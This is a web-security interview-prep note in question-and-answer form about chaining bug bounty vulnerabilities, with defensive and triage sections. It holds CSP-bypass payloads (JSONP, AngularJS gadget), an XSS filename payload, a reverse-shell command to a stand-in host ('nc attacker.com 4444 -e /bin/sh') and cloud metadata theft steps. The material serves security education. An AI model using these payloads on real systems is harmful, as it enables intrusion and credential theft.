---
tags: [interview, web-security, qna, scenario]
difficulty: expert
module: "Interview Prep - Web Security"
topic: "QnA - Web Module 30"
---

# Web QnA - Module 30 - Real World Bug Bounty Scenarios

## Custom ASCII Diagram: The Anatomy of a Bug Bounty Chain

```text
+-----------------------------------------------------------------------------+
|                          Attacker / Bug Hunter                              |
+---------------------------------------+-------------------------------------+
                                        |
      [1. Recon & Discovery]            |
      - Subdomain Enumeration           v
      - JS File Analysis       +-------------------+
      - Parameter Fuzzing      | dev.target.com    | (Forgotten Subdomain)
                               +--------+----------+
                                        |
      [2. Initial Foothold]             |
      - Finds Open CORS Policy          v
      - Finds Minor XSS Vector +-------------------+
                               | Reflected XSS     | (Low Impact standalone)
                               +--------+----------+
                                        |
      [3. Escalation / Pivot]           |
      - Uses XSS to read DOM            v
      - Extracts Admin CSRF    +-------------------+
        Token                  | Admin API Endpoint| (Requires Token & Auth)
                               +--------+----------+
                                        |
      [4. Critical Impact]              |
      - Crafts JS Payload               v
      - Forces Admin to Add    +-------------------+
        Attacker Account       | Account Takeover  | (Critical Bounty Award!)
      - Achieves RCE via panel | / Remote Code Ex. |
                               +-------------------+
```

## Formal Technical Questions

**Q1: In the context of modern Bug Bounty programs, explain the concept of "Chaining." Why is a vulnerability that is marked "Informational" or "Low" often the critical linchpin in a high-severity report?**

**Expert Answer:**
"Chaining" is the art of combining two or more distinct, lower-severity vulnerabilities to achieve a critical security impact that none of the vulnerabilities could achieve independently. 
Bug bounty triagers evaluate impact, not just the presence of a bug. An "Informational" bug, such as verbose error messages revealing an internal IP address or an open CORS policy without credentials allowed, poses minimal direct risk. However, if a hunter discovers a Blind Server-Side Request Forgery (SSRF) that requires an internal IP to target, that informational IP disclosure becomes the roadmap for the SSRF. Similarly, a minor self-XSS (where a user can only attack themselves) is a Low severity finding. But, if chained with a Login Cross-Site Request Forgery (CSRF) vulnerability (forcing a victim to log into the attacker's account), the attacker can force the victim to execute the XSS payload, escalating it to a Critical Stored XSS that compromises the victim's browser session. Chaining demonstrates deep architectural understanding and proves maximum business impact, which is what top-tier bounties reward.

**Q2: Describe the methodology for transitioning from broad reconnaissance (Subdomain enumeration, port scanning) to deep application-level exploitation in a wide-scope Bug Bounty engagement.**

**Expert Answer:**
The transition requires moving from automation to intuition.
1. **Asset Discovery (Broad):** Utilize tools like Amass, Subfinder, and massdns to map the external perimeter. Discover thousands of subdomains, IPs, and open ports.
2. **Filtration & Prioritization:** Broad recon generates noise. The key is filtering for "interesting" assets. Look for staging environments (`dev.`, `staging.`, `qa.`), forgotten legacy panels, or non-standard ports (e.g., 8080, 8443). Tools like `httpx` help identify live web servers and their technologies.
3. **Application Mapping (Deep):** Once a high-value target is identified, manual mapping begins. This involves proxying traffic through Burp Suite, spidering the application, mapping all API endpoints, and understanding the core business logic (user roles, payment flows, document uploads).
4. **JavaScript Analysis:** Deep dive into client-side code. Use tools to un-minify JS files, search for hidden API endpoints, hardcoded credentials, API keys, or routing logic that reveals backend structure.
5. **Targeted Fuzzing:** Instead of blindly running automated scanners, perform targeted fuzzing. If an endpoint takes a `?url=` parameter, test specifically for SSRF, Open Redirects, and LFI. If it takes `?id=`, test for IDOR and SQLi. The transition is marked by abandoning generic payloads in favor of highly customized, context-aware attacks based on the application's specific behavior.

**Q3: How do bug hunters approach analyzing custom authentication and Single Sign-On (SSO) implementations (like SAML or custom OAuth flows) compared to standard username/password forms?**

**Expert Answer:**
Standard forms are tested for SQLi, brute-force, and logic bypasses. Custom SSO implementations require analyzing complex state machines and cryptographic trust relationships.
1. **OAuth/OIDC:** Hunters focus on the redirect flow. They look for `redirect_uri` manipulation to steal authorization codes, missing `state` parameters leading to Login CSRF, and Implicit Flow token leakage in the browser history or Referer headers. They also test the backend's validation of the JWT (JSON Web Token)—checking for algorithm confusion (switching RS256 to HS256), signature stripping, or manipulating claims.
2. **SAML:** SAML involves heavy XML parsing. Hunters test for XML External Entity (XXE) injection in the IdP or SP parsers. They analyze the SAML Assertion signature: Can the signature be removed? Can an assertion signed for one application be replayed to another (Audience Restriction bypass)? Can XML Signature Wrapping (XSW) be used to inject malicious assertion data while keeping the signature mathematically valid?
3. **The Focus:** The focus shifts from "can I guess the password" to "can I trick the Service Provider into trusting an assertion or token I forged, or can I steal the legitimate token in transit?"

## Scenario-Based Questions

**Q4: You discover an Insecure Direct Object Reference (IDOR) on an API endpoint: `GET /api/v1/receipts/1005`. You can view receipts of other users. The impact is currently "Medium" (PII disclosure). How do you escalate this to a "Critical" severity finding?**

**Expert Answer:**
To escalate from PII disclosure to Critical (System Compromise or Account Takeover), I must pivot the IDOR into a write-operation or chained exploit.
1. **Identify Write Endpoints:** I search for endpoints that modify data using similar ID structures, such as `PUT /api/v1/users/1005` or `POST /api/v1/receipts/1005/reimburse`.
2. **Analyze the Data:** I review the PII exposed in the receipt. Does it contain sensitive tokens, password reset links, or internal administrative UUIDs?
3. **Escalation Scenarios:**
   - **Account Takeover via PII:** The receipt might contain the user's full credit card details, date of birth, and secret question answers. I use this harvested PII to bypass the application's "Forgot Password" identity verification mechanism, taking over the account.
   - **IDOR to Privilege Escalation:** If I find a `PUT /api/v1/users/[ID]` endpoint, I test if the IDOR extends to writing data. If I can modify another user's profile, I change the administrator's email address to mine, request a password reset, and achieve Admin Account Takeover.
   - **Mass Assignment:** I attempt to inject administrative flags into the IDOR request (e.g., `PUT /api/v1/users/1005` with body `{"role":"admin"}`). If successful, the IDOR facilitates privilege escalation.
   If I successfully demonstrate that the IDOR leads to full account takeover or financial manipulation (e.g., changing the reimbursement bank account on another user's receipt), the severity instantly escalates to Critical.

**Q5: During a bug bounty, you find a Stored Cross-Site Scripting (XSS) vulnerability in a user profile's "Bio" field. However, the application uses a strict Content Security Policy (CSP) that blocks `unsafe-inline` scripts and only allows scripts from `https://trusted-cdn.com`. How do you bypass this CSP to execute your payload?**

**Expert Answer:**
Bypassing a strict CSP requires leveraging the trusted sources against the application itself.
1. **Analyze the Trusted Origin:** The CSP trusts `https://trusted-cdn.com`. This is the weakest link. I need to find a way to host malicious JavaScript on that CDN or exploit a script already hosted there.
2. **Bypass Strategies:**
   - **JSONP Endpoints:** I search the trusted CDN for JSONP (JSON with Padding) endpoints. JSONP allows arbitrary JavaScript execution by design. If I find `https://trusted-cdn.com/api/weather?callback=execute_me`, I can inject `<script src="https://trusted-cdn.com/api/weather?callback=alert(1)"></script>`. The browser allows it because the domain is whitelisted, and the JSONP endpoint reflects my malicious JS payload.
   - **AngularJS/Vue.js Gadgets:** If the application uses an older version of Angular hosted on the CDN, I can use a CSP bypass gadget. I inject an Angular template payload (e.g., `{{$on.constructor('alert(1)')()}}`) into the DOM. When Angular bootstraps, it evaluates the template and executes the JavaScript, completely bypassing the CSP's restriction on inline scripts.
   - **Open Redirects on CDN:** If the trusted CDN has an open redirect, I might be able to redirect the script source to my attacker domain, though modern browsers usually block this. The JSONP or JS Framework gadget techniques are the most reliable paths to achieving execution.

**Q6: You are hunting on a massive corporate infrastructure. You find a forgotten development server (`dev-internal.corp.com`) that allows anonymous uploads of PDF files. The files are processed by a backend service to extract text. Walk through a potential remote code execution (RCE) chain.**

**Expert Answer:**
Backend processing of complex file formats (like PDFs, Images, or Video) is highly susceptible to exploitation.
1. **Identify the Processing Engine:** I need to determine what library is extracting the text. Common culprits are ImageMagick (if it converts PDF to images first), Ghostscript, or Apache PDFBox. I can often induce an error by uploading a malformed PDF to force a stack trace, revealing the library.
2. **Ghostscript Vulnerabilities:** If the backend uses Ghostscript, it is notoriously vulnerable to RCE. I will craft a malicious PostScript payload embedded within a valid PDF structure. The payload leverages known Ghostscript vulnerabilities (like `-dSAFER` bypasses) to execute shell commands.
   - *Payload example:* I embed PostScript that executes `/bin/bash -c "nc attacker.com 4444 -e /bin/sh"`.
3. **Server-Side Request Forgery (SSRF) via PDF:** Alternatively, modern PDF processors often attempt to resolve external resources (like images or fonts linked via URLs within the PDF). I can embed an internal URL (`http://169.254.169.254/latest/meta-data/` for AWS environments) into the PDF. When the server processes the PDF, it fetches the cloud metadata and embeds it into the resulting text output. I download the output and steal the cloud IAM credentials.
4. **Execution:** By uploading the crafted PDF, the backend parser processes it, triggers the embedded PostScript exploit, and grants me a reverse shell, achieving critical Remote Code Execution.

## Deep-Dive Defensive Questions

**Q7: From a DevSecOps perspective, how do you defend against complex vulnerability chains? What architectural principles disrupt the attacker's ability to link low-severity bugs together?**

**Expert Answer:**
Defending against chains requires Defense in Depth; assuming perimeter controls will fail and ensuring the internal architecture limits the blast radius.
1. **Micro-Segmentation and Zero Trust:** An attacker might find an SSRF (a low severity bug if it hits nothing critical). By implementing strict network micro-segmentation, that SSRF is trapped. The web server is mathematically forbidden from communicating with internal HR databases or Cloud Metadata endpoints. The chain is broken.
2. **Context-Aware Encoding & CSP:** To break XSS chains, developers must use context-aware output encoding (encoding differently for HTML body vs. JavaScript variables). Enforcing a strict, nonce-based Content Security Policy (CSP) ensures that even if an attacker successfully injects a payload (Stored XSS), the browser refuses to execute it, neutralizing the pivot point for account takeover.
3. **Robust Identity and Access Management (IAM):** To prevent IDOR from escalating, implement strict, centralized authorization logic. An endpoint must not just ask "Does ID 1005 exist?", it must ask "Does the currently authenticated user session hold the cryptographic authorization to access ID 1005?".
4. **Ephemeral Environments:** Development and staging environments (`dev.corp.com`) are massive attack vectors. Defend them by making them ephemeral (destroying them when not in active use) and placing them behind strong VPN or Zero Trust Network Access (ZTNA) gateways, removing them entirely from the public bug hunter's reconnaissance scope.

**Q8: Explain the concept of "Regression Testing" in the context of resolving Bug Bounty reports. Why is simply patching the reported endpoint often insufficient?**

**Expert Answer:**
Regression testing ensures that a vulnerability is systematically eradicated across the entire codebase, not just band-aided at the specific endpoint reported by the hunter.
1. **The Incomplete Patch:** A hunter reports an IDOR on `GET /api/v1/invoices/[ID]`. A developer adds an authorization check to that specific route. The report is marked "Resolved."
2. **The Root Cause:** The developer failed to realize that the root cause was the lack of a centralized authorization middleware. The mobile application API (`/api/mobile/invoices/[ID]`) and the legacy XML endpoint (`/api/v2/soap/invoices`) still lack the check.
3. **Regression & Variant Analysis:** Upon receiving a valid report, the security team must perform Variant Analysis. They search the entire codebase for similar patterns (e.g., all endpoints accepting an `[ID]` parameter).
4. **Automated Regression:** Once patched, the security team must write automated security tests (DAST or integration tests) specifically designed to exploit the reported vulnerability. These tests are integrated into the CI/CD pipeline. If a future developer accidentally removes the authorization check, the regression test fails the build, preventing the vulnerability from re-entering production.

**Q9: When triaging a Bug Bounty report claiming a Critical Server-Side Request Forgery (SSRF), what specific evidence must the security engineer demand from the hunter to validate the severity and rule out a "Blind" or "DNS-only" SSRF?**

**Expert Answer:**
SSRF severity ranges from Informational to Critical based entirely on the impact.
1. **DNS-Only / Out-of-Band (Informational/Low):** The hunter provides a screenshot of a DNS pingback to their Burp Collaborator server. This only proves the server attempted to resolve the domain. It does not prove HTTP interaction or data retrieval. Severity remains low.
2. **Blind SSRF (Medium):** The hunter proves HTTP interaction (e.g., they receive an HTTP GET request on their server from the target). However, they cannot read the response. They might be able to port-scan internal networks based on timing differences, but data exfiltration is limited.
3. **Validating Critical Severity:** To classify the SSRF as High/Critical, the engineer must demand evidence of **Impact**. The hunter must demonstrate:
   - **Data Exfiltration:** Successfully retrieving internal data and showing it in the HTTP response (e.g., reading `/etc/passwd` via `file://` protocol, or retrieving internal Confluence wiki pages).
   - **Cloud Metadata Compromise:** Successfully querying `http://169.254.169.254` and providing a screenshot of valid AWS IAM tokens or Azure Managed Identity credentials.
   - **Internal Exploitation:** Using the SSRF to send a destructive POST request to an unauthenticated internal service (e.g., triggering a Jenkins build or interacting with an internal Redis instance to achieve RCE).
   Without proof of access to sensitive internal data or lateral movement, the SSRF cannot be prioritized as a critical infrastructure compromise.

## Real-World Attack Scenario

A top-tier bug hunter targeted a ride-sharing application. The engagement began with deep reconnaissance, leading to the discovery of a developer API portal: `developer.target.com`.

1. **The Initial Find (Low Severity):** The portal allowed users to upload custom avatar images. The hunter discovered that the image upload endpoint lacked proper sanitization on the filename parameter. By manipulating the filename to `"><img src=x onerror=alert(1)>.jpg`, they achieved Reflected XSS. Standing alone, this was a Low severity bug, as it required tricking a developer into clicking a malicious link.
2. **The Pivot (Medium Severity):** The hunter noticed the portal utilized a poorly configured Cross-Origin Resource Sharing (CORS) policy. `Access-Control-Allow-Origin` was set dynamically based on the `Origin` header, but it validated any domain ending in `target.com` (e.g., `evil-target.com` would pass).
3. **The Chain (Critical Severity):**
   - The hunter registered `attacker-target.com`.
   - They hosted a malicious HTML page on this domain.
   - The page contained JavaScript that leveraged the CORS misconfiguration to make authenticated XMLHttpRequests to the developer portal's backend API on behalf of any visiting victim.
   - To force the victim to execute this, the hunter utilized the initial Reflected XSS vulnerability. They crafted a payload that silently redirected an authenticated administrator visiting the developer portal to the malicious `attacker-target.com` page.
   - Once the administrator's browser hit the attacker's page, the malicious JavaScript executed. Leveraging the permissive CORS policy, it sent a `POST /api/v1/admin/generate_api_key` request to the backend.
   - The backend, seeing the administrator's valid session cookies and the "trusted" (due to the flawed regex) Origin header, generated a master API key and returned it to the attacker's script.
4. **The Impact:** The attacker successfully chained a minor Reflected XSS and a CORS misconfiguration to silently steal a Master API key, granting them full read/write access to the entire ride-sharing platform's backend database, resulting in a maximum bounty payout.

## Chaining Opportunities
- **Open Redirect to OAuth Token Theft:** Using an open redirect on a trusted subdomain to bounce an OAuth flow to an attacker-controlled domain, stealing the access token.
- **CORS Misconfiguration to CSRF:** Using permissive CORS to read CSRF tokens dynamically, bypassing anti-CSRF protections and forcing state-changing actions.
- **File Upload to XSS / RCE:** Uploading an SVG file containing malicious XML (XSS) or uploading a web shell (RCE) if execution directories are misconfigured.
- **Blind SQLi to RCE:** Escalating a Blind SQL injection by using database functions (like `xp_cmdshell` in MSSQL or `INTO OUTFILE` in MySQL) to write a web shell to the server's filesystem.

## Related Notes
- [[Methodology - Bug Bounty Reconnaissance Strategies]]
- [[Web Module 03 - Cross-Site Scripting (XSS)]]
- [[Web Module 08 - Server-Side Request Forgery (SSRF)]]
- [[Architecture - Microservices Security Patterns]]
